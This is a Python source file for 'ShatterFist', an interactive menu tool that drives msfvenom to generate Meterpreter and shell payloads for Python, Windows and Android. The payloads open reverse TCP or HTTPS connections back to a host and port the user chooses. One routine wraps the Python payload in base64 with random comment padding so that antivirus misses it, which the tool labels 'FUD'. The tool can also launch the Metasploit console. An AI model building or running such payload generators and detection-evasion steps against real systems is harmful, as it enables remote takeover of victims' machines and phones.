#!/usr/bin/env python3
import colorama
import subprocess
import sys
import re 
import base64
import random
import string 
import time 


banner= ('''
@@@@@@   @@@  @@@   @@@@@@   @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@@  @@@   @@@@@@   @@@@@@@  
@@@@@@@   @@@  @@@  @@@@@@@@  @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@@@@@   @@@@@@@  
!@@       @@!  @@@  @@!  @@@    @@!      @@!    @@!       @@!  @@@  @@!       @@!  !@@         @@!    
!@!       !@!  @!@  !@!  @!@    !@!      !@!    !@!       !@!  @!@  !@!       !@!  !@!         !@!    
!!@@!!    @!@!@!@!  @!@!@!@!    @!!      @!!    @!!!:!    @!@!!@!   @!!!:!    !!@  !!@@!!      @!!    
 !!@!!!   !!!@!!!!  !!!@!!!!    !!!      !!!    !!!!!:    !!@!@!    !!!!!:    !!!   !!@!!!     !!!    
     !:!  !!:  !!!  !!:  !!!    !!:      !!:    !!:       !!: :!!   !!:       !!:       !:!    !!:    
    !:!   :!:  !:!  :!:  !:!    :!:      :!:    :!:       :!:  !:!  :!:       :!:      !:!     :!:    
:::: ::   ::   :::  ::   :::     ::       ::     :: ::::  ::   :::   ::        ::  :::: ::      ::    
:: : :     :   : :   :   : :     :        :     : :: ::    :   : :   :        :    :: : :       :     
                                                                                                      
                                                                                                      
@@@  @@@   @@@@@@                                                                                     
@@@  @@@  @@@@@@@@                                                                                    
@@!  @@@       @@@                                                                                    
!@!  @!@      @!@                                                                                     
@!@  !@!     !!@                                                                                      
!@!  !!!    !!:                                                                                       
:!:  !!:   !:!                                                                                        
 ::!!:!   :!:                                                                                         
  ::::    :: :::::                                                                                    
   :      :: : :::                                                                                    
                                  ''')


banner2 = ''' 
  .dBBBBP   dBP dBP dBBBBBb  dBBBBBBP dBBBBBBP dBBBP dBBBBBb    dBBBBP dBP.dBBBBP dBBBBBBP
  BP                     BB                              dBP              BP              
  `BBBBb  dBBBBBP    dBP BB   dBP      dBP   dBBP    dBBBBK   dBBBP  dBP  `BBBBb   dBP    
     dBP dBP dBP    dBP  BB  dBP      dBP   dBP     dBP  BB  dBP    dBP      dBP  dBP     
dBBBBP' dBP dBP    dBBBBBBB dBP      dBP   dBBBBP  dBP  dB' dBP    dBP  dBBBBP'  dBP      '''   


banner3 = '''
╔═╗┬ ┬┌─┐┌┬┐┌┬┐┌─┐┬─┐╔═╗┬┌─┐┌┬┐
╚═╗├─┤├─┤ │  │ ├┤ ├┬┘╠╣ │└─┐ │ 
╚═╝┴ ┴┴ ┴ ┴  ┴ └─┘┴└─╚  ┴└─┘ ┴ '''

lhost = "localhost"
lport = "4962"
pyoutfile = "pythonpayload.py"
winoutfile = "windowspayload.exe"
androutfile = "androidpayload.apk"
defaultarch = "x86"
talkbackm1 = "tcp"

def clearscreen():
    if sys.platform == "linux":
        subprocess.run("clear")
    elif sys.platform == "win32":
        subprocess.run("cls", shell=True)

#For printopt func
n = 1
def printopt(texxt):  
    global n
    print(colorama.Fore.BLUE +  "[" +  colorama.Fore.LIGHTWHITE_EX + str(n) + colorama.Fore.BLUE + "] " + colorama.Style.RESET_ALL + colorama.Fore.LIGHTBLUE_EX + texxt + colorama.Style.RESET_ALL)
    n += 1   
def printopt2(opt, texxt):
    print(colorama.Fore.BLUE +  "[" +  colorama.Fore.LIGHTWHITE_EX + str(opt) + colorama.Fore.BLUE + "] " + colorama.Style.RESET_ALL + colorama.Fore.LIGHTBLUE_EX + str(texxt) + colorama.Style.RESET_ALL)
def printbannred(texxt):
    return print(colorama.Fore.LIGHTRED_EX +  "#=====+" + texxt + "+=====#" )

def inputc(texxt):
    print("\n")
    inputcy = input(colorama.Fore.LIGHTYELLOW_EX + str(texxt) + colorama.Fore.GREEN).strip()
    print(colorama.Style.RESET_ALL)  
    return inputcy    

def lask():
    global lhost, lport
    lhostask = inputc("Enter Host leave empty for default " + colorama.Fore.LIGHTRED_EX + "(" + lhost + ")" + colorama.Fore.BLUE + " : ")
    lportask = inputc("Enter Host leave empty for default " + colorama.Fore.LIGHTRED_EX +  "(" + lport +  ")" + colorama.Fore.BLUE + " : ")
    if lhostask.strip() != '':
        lhost = str(lhostask)
    if lportask.strip() != '':
        lport = str(lportask)    
    print(colorama.Style.RESET_ALL)

def payloadgen1(payload, talkback, lhost, lport, outfile):
    subprocess.run(["msfvenom", "-p", payload + "/meterpreter/reverse_" + talkback, "LHOST=" + lhost, "LPORT=" + str(lport), "-o", outfile])    

def payloadgen2(payloadandsession, lhost, lport, outfile, args1, args2):
    try:
        subprocess.run(f"msfvenom {args1} -p {payloadandsession} LHOST={lhost} LPORT={lport} {args2} -o {outfile}", check=True,shell=True)   
    except:
        print(colorama.Fore.LIGHTRED_EX +  "An error has occured! Please read the above output and make sure you entered the options properly!" + colorama.Style.RESET_ALL)
    else: 
        print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {outfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)  
    finally:
        input(colorama.Fore.LIGHTBLUE_EX + "Press any key to continue" + colorama.Style.RESET_ALL)    
def asktb():
    global n, talkbackm1 
    n = 1 
    printopt("Use reverse_tcp")
    printopt("Use reverse_https")
    talkbackopt = inputc("Option: ").strip()
    if  talkbackopt == "1" or talkbackopt == "tcp":
        talkbackm1 = "tcp"
        print (f"{colorama.Fore.GREEN}Using {colorama.Fore.LIGHTRED_EX}{talkbackm1} {colorama.Style.RESET_ALL}\n")
    elif talkbackopt == "2" or talkbackopt == "https":
        talkbackm1 = "https"
        print (f"{colorama.Fore.GREEN}Using {colorama.Fore.LIGHTRED_EX}{talkbackm1} {colorama.Style.RESET_ALL}\n")

    else:
        print (f"{colorama.Fore.GREEN}Defaulting to {colorama.Fore.LIGHTRED_EX}{talkbackm1} {colorama.Style.RESET_ALL}\n")


def pythonpayload():
    global n, pyoutfile, lhost, lport, talkbackm1 
    n = 1
    clearscreen()
    printbannred("Python Payload Menu")
    time.sleep(0.2)
    printopt("Create a simple python meterpreter payload")
    time.sleep(0.1)
    printopt("Create an obfistucated (FUD) python meterpreter payload")
    time.sleep(0.1)
    inputpy = inputc("Option: ").strip()
    lask()
    inputpy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({pyoutfile}){colorama.Fore.BLUE}: ")
    asktb()
    if inputpy2.strip() != "":
        pyoutfile = inputpy2
    #generate simple payload    
    if inputpy == "1":
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        #payloadgen1("python", talkbackm1, lhost, lport, pyoutfile)
        payloadgen2(f"python/meterpreter/reverse_{talkbackm1}", lhost, lport, pyoutfile, '', '')
        time.sleep(2)
        menu()
    #PYFUD starts here     
    elif inputpy == "2": 
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen1("python", talkbackm1, lhost, lport, pyoutfile + ".tmp")    
        pythonpayloadfud()

def pythonpayloadfud():
    print("Making payload FUD...")
    pytempf = open(pyoutfile + ".tmp", "r")
    dat1 = pytempf.readline()
    #part of file b4 base64 code
    b4b64 = "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('"
    #part of file after
    afb64 = "')[0]))"
    b64pycode = re.search("\('utf-8'\)\('(.+)'\)\[0\]\)", dat1).group(1)
    pytempf.close()
    pycode = base64.b64decode(b64pycode)
    #print(pycode)
    splpycode = pycode.decode().split("\n")
    #print(splpycode)
    pycodeembedlist = []
    for z in splpycode:
        pycodeembedlist.append(z)
        pycodeembedlist.append("\n")
        pycodeembedlist.append( '#' + ''.join(random.choices(string.ascii_letters + string.digits, k=50)))
        pycodeembedlist.append("\n")
    finalcode = ''.join(pycodeembedlist)  
    finalcodeb64  = base64.b64encode(finalcode.encode("utf-8"))
    outpy = (b4b64 + str(finalcodeb64) + afb64)
    file = open(pyoutfile, "w")
    file.write(outpy)
    file.close
    print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {pyoutfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)  
    input(colorama.Fore.LIGHTBLUE_EX + "Press any key to continue" + colorama.Style.RESET_ALL)   
    n = 1  
    menu()

def winpayload():                         
    global n, winoutfile, lhost, lport, talkbackm1
    n = 1
    clearscreen()
    printbannred("Windows Payload Menu")
    printopt("Create a simple windows meterpreter payload")
    printopt("Create a siple windows shell payload")
    inputwin = inputc("Option: ").strip()
    lask()
    inputy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({winoutfile}){colorama.Fore.BLUE}: ")
    asktb()
    if inputy2.strip() != "":
        winoutfile = inputy2
    #WinMeterpeter    
    if inputwin == "1": 
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen2("windows/meterpreter/reverse_tcp", lhost, lport, winoutfile,f'-a {defaultarch}','-b "\\x00" -f exe')
        menu()
    #WinShell    
    if inputwin == "2":
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen2("windows/shell/reverse_tcp", lhost, lport, winoutfile,f'-a {defaultarch}','-b "\\x00" -f exe')

    else:
        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputwin} is not valid" + colorama.Style.RESET_ALL) 
        time.sleep(2)
        winpayload()   

def androidpayload():
    global  n, androutfile, lhost, lport, talkbackm1
    n = 1
    clearscreen()
    printbannred("Android Payload Menu")
    printopt("Create a simple android payload")
    inputy = inputc("Option: ").strip()
    lask()
    asktb()
    if inputy == "1": 
        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
        payloadgen2(f"android/meterpreter/reverse_{talkbackm1}", lhost, lport, androutfile, '', '')
        menu()

    else:
        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputy} is not valid" + colorama.Style.RESET_ALL) 
        time.sleep(2)
        androidpayload()   
def miscmenu():
    print(colorama.Fore.LIGHTRED_EX + "NOT READY YET!!!" + colorama.Style.RESET_ALL)
    time.sleep(2)
    menu()    

def menu():
    global n 
    n = 1
    clearscreen()
    print(colorama.Fore.LIGHTRED_EX + colorama.Style.BRIGHT + banner3 +  colorama.Style.RESET_ALL)
    print(colorama.Style.BRIGHT + "BETA" + colorama.Style.RESET_ALL)
    print("\n")
    printopt("Python payload menu")
    printopt("Windows payload menu")
    printopt("Android payload menu")
    #printopt("Miscellaneous payloads")
    printopt2("M", "Start the Metasploit Framework Console")
    printopt2("E", "Exit ShatterFist")
    input1 = inputc("Option: ").strip().lower()
    if input1 == "1":
        time.sleep(0.1)
        pythonpayload()

    elif input1 == "2":
        winpayload()

    elif input1 == "3":
        androidpayload() 
    elif input1 == "4":
        miscmenu()
    elif input1 == "m" or input1 == "msfconsole":
        clearscreen()
        print(colorama.Fore.LIGHTRED_EX)
        subprocess.run("msfconsole")   
    
    elif input1  == "e" or input1 == "exit":
        clearscreen()
        print(colorama.Fore.LIGHTRED_EX)
        bye = "Thanks for using ShatterFist!"
        for letter in bye:
            print(letter,end="", flush=True)
            time.sleep(0.05)
        print("")
        time.sleep(0.1)
        sys.exit()

    else:
        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {input1} is not valid" + colorama.Style.RESET_ALL)
        time.sleep(2)
        menu()        
        
def main():
    time.sleep(0.1)
    menu()
colorama.init()    
main()                                                          